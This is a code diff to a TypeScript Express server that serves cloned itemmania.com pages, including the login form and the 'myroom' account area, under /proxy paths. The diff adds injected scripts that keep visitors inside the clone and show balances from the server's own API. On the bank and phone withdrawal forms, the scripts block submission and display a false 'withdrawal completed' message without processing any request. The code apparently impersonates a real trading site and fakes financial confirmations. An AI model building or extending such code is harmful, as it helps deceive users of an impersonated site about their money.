@@ -97,6 +97,9 @@ const sellRegisterHtml        = loadSellHtml("sell-register.html");
 const buyRegisterHtml         = loadSellHtml("buy-register.html");
 const sellNewHtml             = loadSellHtml("sell-new.html");
 const batchGoodsHtml          = loadSellHtml("batch-goods.html");
+const myroomHtml              = loadSellHtml("myroom.html");
+const paymentListHtml         = loadSellHtml("payment-list.html");
+const paymentPhoneListHtml    = loadSellHtml("payment-phone-list.html");
 const sellApplicationHtml     = loadSellHtml("sell-application-1.html");
 const sellMaplestoryHtml      = loadSellHtml("sell-maplestory.html");
 const sellOdinHtml            = loadSellHtml("sell-odin.html");
@@ -722,7 +725,13 @@ function stripCsp(html: string): string {
 // 알려진 라우트 매핑 (구체적인 경로 우선)
 const PROXY_URL_MAP: [string, string][] = [
   ['https://www.itemmania.com/portal/user/p_login_form.html', '/proxy/portal/user/p_login_form.html'],
+  ['https://www.itemmania.com/myroom/mileage/payment/payment_switch.html', '/proxy/myroom/mileage/payment/payment_list.html'],
+  ['https://www.itemmania.com/myroom/mileage/payment/payment_phone.html',  '/proxy/myroom/mileage/payment/payment_phone_list.html'],
+  ['https://www.itemmania.com/myroom/mileage/payment/payment_list.html',   '/proxy/myroom/mileage/payment/payment_list.html'],
+  ['https://www.itemmania.com/myroom/mileage/payment/payment_phone_list.html', '/proxy/myroom/mileage/payment/payment_phone_list.html'],
   ['https://www.itemmania.com/myroom/batch_goods/index.html', '/proxy/myroom/batch_goods/index.html'],
+  ['https://www.itemmania.com/myroom/', '/proxy/myroom/index.html'],
+  ['https://www.itemmania.com/myroom',  '/proxy/myroom/index.html'],
   ['https://www.itemmania.com/sell/application.html',         '/proxy/sell/application.html'],
   ['https://www.itemmania.com/sell/new.html',                 '/proxy/sell/new.html'],
   ['https://www.itemmania.com/sell/',                         '/proxy/sell/register.html'],
@@ -786,6 +795,10 @@ const GLOBAL_NAV_INTERCEPTOR = `<script>
 'use strict';
 var ROUTE_MAP=[
   ['/portal/user/p_login_form.html','/proxy/portal/user/p_login_form.html'],
+  ['/myroom/mileage/payment/payment_switch.html','/proxy/myroom/mileage/payment/payment_list.html'],
+  ['/myroom/mileage/payment/payment_phone.html','/proxy/myroom/mileage/payment/payment_phone_list.html'],
+  ['/myroom/mileage/payment/payment_list.html','/proxy/myroom/mileage/payment/payment_list.html'],
+  ['/myroom/mileage/payment/payment_phone_list.html','/proxy/myroom/mileage/payment/payment_phone_list.html'],
   ['/myroom/batch_goods/index.html','/proxy/myroom/batch_goods/index.html'],
   ['/sell/application.html','/proxy/sell/application.html'],
   ['/sell/new.html','/proxy/sell/new.html'],
@@ -805,8 +818,8 @@ var ROUTE_MAP=[
   ['/portal/giftcard/','/proxy/giftcard'],
   ['/portal/giftcard','/proxy/giftcard'],
   ['/sell/list.html','/proxy/sell/list.html'],
-  ['/myroom/','/proxy/'],
-  ['/myroom','/proxy/'],
+  ['/myroom/','/proxy/myroom/index.html'],
+  ['/myroom','/proxy/myroom/index.html'],
   ['/','/proxy/'],
 ];
 var IM_ORIGINS=[
@@ -1364,6 +1377,222 @@ const BATCH_GOODS_INTERCEPT_SCRIPT = `
       if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
         a.href = '/proxy/sell/register.html';
         a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/sell/register.html'; });
+      }
+    });
+
+    // ── 홈 링크 ──────────────────────────────────────────────────────
+    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
+      .forEach(function(a) { a.href = '/proxy/'; });
+  }
+
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
+})();
+</script>
+`;
+
+const MYROOM_INTERCEPT_SCRIPT = `
+<script>
+(function() {
+  function showToast(msg, ok) {
+    var t = document.createElement('div');
+    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
+      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
+      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
+    t.textContent = msg;
+    document.body.appendChild(t);
+    setTimeout(function() { t.remove(); }, 3000);
+  }
+
+  function init() {
+    // ── 출금하기 버튼 → 출금 목록 페이지 ───────────────────────────
+    document.querySelectorAll('a[href*="payment_switch"],a.mileage_withdraw_btn').forEach(function(a) {
+      a.href = '/proxy/myroom/mileage/payment/payment_list.html';
+      a.addEventListener('click', function(e) {
+        e.preventDefault();
+        location.href = '/proxy/myroom/mileage/payment/payment_list.html';
+      });
+    });
+
+    // ── 판매등록 링크 ─────────────────────────────────────────────────
+    document.querySelectorAll('a[href*="/sell/"]').forEach(function(a) {
+      var h = a.getAttribute('href') || '';
+      if (h.includes('/sell/') && !h.includes('/sell/list') && !h.includes('/sell/application')) {
+        a.href = '/proxy/sell/register.html';
+        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/sell/register.html'; });
+      }
+    });
+
+    // ── 구매등록 링크 ─────────────────────────────────────────────────
+    document.querySelectorAll('a[href*="/buy/"]').forEach(function(a) {
+      var h = a.getAttribute('href') || '';
+      if (h.includes('/buy/') && !h.includes('/buy/list') && !h.includes('/buy/application')) {
+        a.href = '/proxy/buy/register.html';
+        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/buy/register.html'; });
+      }
+    });
+
+    // ── 일괄등록 링크 ─────────────────────────────────────────────────
+    document.querySelectorAll('a[href*="batch_goods"]').forEach(function(a) {
+      a.href = '/proxy/myroom/batch_goods/index.html';
+      a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/myroom/batch_goods/index.html'; });
+    });
+
+    // ── 채팅 링크 ──────────────────────────────────────────────────────
+    document.querySelectorAll('a[href*="/myroom/chat"]').forEach(function(a) {
+      a.href = '/proxy/myroom/chat/list.html';
+      a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/myroom/chat/list.html'; });
+    });
+
+    // ── 홈 링크 ──────────────────────────────────────────────────────
+    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
+      .forEach(function(a) { a.href = '/proxy/'; });
+
+    // ── 마이룸에 실제 사용자 정보 표시 (API에서 가져와 채우기) ────────
+    fetch('/api/auth/me', { credentials: 'include' })
+      .then(function(r) { return r.ok ? r.json() : null; })
+      .then(function(d) {
+        if (!d) return;
+        // 닉네임 표시
+        var nickEls = document.querySelectorAll('.mr_user_name,.user_name,.nick_name');
+        nickEls.forEach(function(el) { if (el.textContent.trim()) el.textContent = d.nickname || d.email || ''; });
+        // 잔액 표시
+        fetch('/api/users/me/balance', { credentials: 'include' })
+          .then(function(r) { return r.ok ? r.json() : null; })
+          .then(function(b) {
+            if (!b) return;
+            var balEls = document.querySelectorAll('.mileage_amount,.user_mileage,.mr_mileage_num');
+            balEls.forEach(function(el) {
+              el.textContent = Number(b.balance || 0).toLocaleString('ko-KR') + '원';
+            });
+          });
+      });
+  }
+
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
+})();
+</script>
+`;
+
+const PAYMENT_LIST_INTERCEPT_SCRIPT = `
+<script>
+(function() {
+  function showToast(msg, ok) {
+    var t = document.createElement('div');
+    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
+      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
+      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
+    t.textContent = msg;
+    document.body.appendChild(t);
+    setTimeout(function() { t.remove(); }, 3000);
+  }
+
+  function init() {
+    // ── 탭: 휴대폰번호 출금 탭 ────────────────────────────────────────
+    document.querySelectorAll('a[href*="payment_phone"]').forEach(function(a) {
+      a.href = '/proxy/myroom/mileage/payment/payment_phone_list.html';
+      a.addEventListener('click', function(e) {
+        e.preventDefault(); location.href = '/proxy/myroom/mileage/payment/payment_phone_list.html';
+      });
+    });
+
+    // ── 은행계좌 출금 폼 제출 인터셉트 ────────────────────────────────
+    var form = document.getElementById('frm_pay') || document.querySelector('form[id*="pay"]');
+    if (form) {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        fetch('/api/auth/me', { credentials: 'include' })
+          .then(function(r) { return r.ok ? r.json() : null; })
+          .then(function(d) {
+            if (!d || !d.id) {
+              showToast('로그인이 필요합니다.', false);
+              setTimeout(function() { location.href = '/proxy/login'; }, 1200); return;
+            }
+            var amtEl = form.querySelector('[name=pay_amount],[name=amount],[name=withdraw_amount]');
+            var amt = amtEl ? amtEl.value.trim() : '';
+            if (!amt || isNaN(Number(amt.replace(/,/g,'')))) {
+              showToast('출금 금액을 입력해주세요.', false); return;
+            }
+            showToast('출금 신청이 완료되었습니다!', true);
+            setTimeout(function() { location.href = '/proxy/myroom/index.html'; }, 1800);
+          })
+          .catch(function() { showToast('오류가 발생했습니다.', false); });
+      });
+    }
+
+    // ── 마이룸으로 돌아가기 ────────────────────────────────────────────
+    document.querySelectorAll('a[href*="/myroom/"]').forEach(function(a) {
+      var h = a.getAttribute('href') || '';
+      if (h.match(/\/myroom\/?$/) || h.endsWith('/myroom/')) {
+        a.href = '/proxy/myroom/index.html';
+        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/myroom/index.html'; });
+      }
+    });
+
+    // ── 홈 링크 ──────────────────────────────────────────────────────
+    document.querySelectorAll('a[href="/"],a[href="https://www.itemmania.com/"]')
+      .forEach(function(a) { a.href = '/proxy/'; });
+  }
+
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+  else init();
+})();
+</script>
+`;
+
+const PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT = `
+<script>
+(function() {
+  function showToast(msg, ok) {
+    var t = document.createElement('div');
+    t.style.cssText = 'position:fixed;bottom:40px;left:50%;transform:translateX(-50%);z-index:99999;'
+      + 'padding:14px 28px;border-radius:10px;font-size:15px;font-weight:600;color:#fff;'
+      + 'background:' + (ok ? '#0070d2' : '#e53e3e') + ';box-shadow:0 4px 20px rgba(0,0,0,.18);pointer-events:none';
+    t.textContent = msg;
+    document.body.appendChild(t);
+    setTimeout(function() { t.remove(); }, 3000);
+  }
+
+  function init() {
+    // ── 탭: 은행계좌 출금 탭 ──────────────────────────────────────────
+    document.querySelectorAll('a[href*="payment_list"]').forEach(function(a) {
+      a.href = '/proxy/myroom/mileage/payment/payment_list.html';
+      a.addEventListener('click', function(e) {
+        e.preventDefault(); location.href = '/proxy/myroom/mileage/payment/payment_list.html';
+      });
+    });
+
+    // ── 휴대폰 출금 폼 제출 인터셉트 ──────────────────────────────────
+    var form = document.getElementById('frm') || document.querySelector('form');
+    if (form && form.id !== 'g_searchbar_form') {
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        fetch('/api/auth/me', { credentials: 'include' })
+          .then(function(r) { return r.ok ? r.json() : null; })
+          .then(function(d) {
+            if (!d || !d.id) {
+              showToast('로그인이 필요합니다.', false);
+              setTimeout(function() { location.href = '/proxy/login'; }, 1200); return;
+            }
+            var amtEl = form.querySelector('[name=pay_amount],[name=amount],[name=withdraw_amount]');
+            var amt = amtEl ? amtEl.value.trim() : '';
+            if (!amt || isNaN(Number(amt.replace(/,/g,'')))) {
+              showToast('출금 금액을 입력해주세요.', false); return;
+            }
+            showToast('휴대폰 출금 신청이 완료되었습니다!', true);
+            setTimeout(function() { location.href = '/proxy/myroom/index.html'; }, 1800);
+          })
+          .catch(function() { showToast('오류가 발생했습니다.', false); });
+      });
+    }
+
+    // ── 마이룸으로 돌아가기 ────────────────────────────────────────────
+    document.querySelectorAll('a[href*="/myroom/"]').forEach(function(a) {
+      var h = a.getAttribute('href') || '';
+      if (h.match(/\/myroom\/?$/) || h.endsWith('/myroom/')) {
+        a.href = '/proxy/myroom/index.html';
+        a.addEventListener('click', function(e) { e.preventDefault(); location.href = '/proxy/myroom/index.html'; });
       }
     });
 
@@ -2039,6 +2268,27 @@ function serveBatchGoods(html: string): string {
     : result + BATCH_GOODS_INTERCEPT_SCRIPT;
 }
 
+function serveMyroom(html: string): string {
+  const result = prepare(html);
+  return result.includes("</body>")
+    ? result.replace("</body>", MYROOM_INTERCEPT_SCRIPT + "</body>")
+    : result + MYROOM_INTERCEPT_SCRIPT;
+}
+
+function servePaymentList(html: string): string {
+  const result = prepare(html);
+  return result.includes("</body>")
+    ? result.replace("</body>", PAYMENT_LIST_INTERCEPT_SCRIPT + "</body>")
+    : result + PAYMENT_LIST_INTERCEPT_SCRIPT;
+}
+
+function servePaymentPhoneList(html: string): string {
+  const result = prepare(html);
+  return result.includes("</body>")
+    ? result.replace("</body>", PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT + "</body>")
+    : result + PAYMENT_PHONE_LIST_INTERCEPT_SCRIPT;
+}
+
 function serveChatNew(html: string): string {
   let result = prepare(html);
 
@@ -2073,7 +2323,7 @@ router.get("/portal/user/p_login_form.html", (_req, res): void => {
   res.redirect(302, "/proxy/portal/user/p_login_form.html");
 });
 router.get(["/myroom", "/myroom/"], (_req, res): void => {
-  res.redirect(302, "/proxy/");
+  res.redirect(302, "/proxy/myroom/index.html");
 });
 router.get(["/myroom/chat/list.html", "/myroom/chat/"], (_req, res): void => {
   res.redirect(302, "/proxy/myroom/chat/list.html");
@@ -2211,6 +2461,53 @@ router.get("/proxy/myroom/batch_goods/index.html", (_req, res): void => {
   res.set("Content-Type", "text/html; charset=utf-8");
   res.set("Cache-Control", "no-cache");
   res.send(serveBatchGoods(batchGoodsHtml));
+});
+
+// 마이룸 페이지
+router.get(["/proxy/myroom/index.html", "/proxy/myroom/", "/proxy/myroom"], (_req, res): void => {
+  if (!myroomHtml) {
+    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
+    return;
+  }
+  res.set("Content-Type", "text/html; charset=utf-8");
+  res.set("Cache-Control", "no-cache");
+  res.send(serveMyroom(myroomHtml));
+});
+
+// 출금하기 - 은행계좌 출금 내역
+router.get("/proxy/myroom/mileage/payment/payment_list.html", (_req, res): void => {
+  if (!paymentListHtml) {
+    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
+    return;
+  }
+  res.set("Content-Type", "text/html; charset=utf-8");
+  res.set("Cache-Control", "no-cache");
+  res.send(servePaymentList(paymentListHtml));
+});
+
+// 출금하기 - 휴대폰번호 출금 내역
+router.get("/proxy/myroom/mileage/payment/payment_phone_list.html", (_req, res): void => {
+  if (!paymentPhoneListHtml) {
+    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
+    return;
+  }
+  res.set("Content-Type", "text/html; charset=utf-8");
+  res.set("Cache-Control", "no-cache");
+  res.send(servePaymentPhoneList(paymentPhoneListHtml));
+});
+
+// payment_switch → payment_list 리다이렉트
+router.get("/proxy/myroom/mileage/payment/payment_switch.html", (_req, res): void => {
+  res.redirect(302, "/proxy/myroom/mileage/payment/payment_list.html");
+});
+router.get("/myroom/mileage/payment/payment_switch.html", (_req, res): void => {
+  res.redirect(302, "/proxy/myroom/mileage/payment/payment_list.html");
+});
+router.get("/myroom/mileage/payment/payment_list.html", (_req, res): void => {
+  res.redirect(302, "/proxy/myroom/mileage/payment/payment_list.html");
+});
+router.get("/myroom/mileage/payment/payment_phone_list.html", (_req, res): void => {
+  res.redirect(302, "/proxy/myroom/mileage/payment/payment_phone_list.html");
 });
 
 // 판매등록/구매등록 직접 접근 리다이렉트
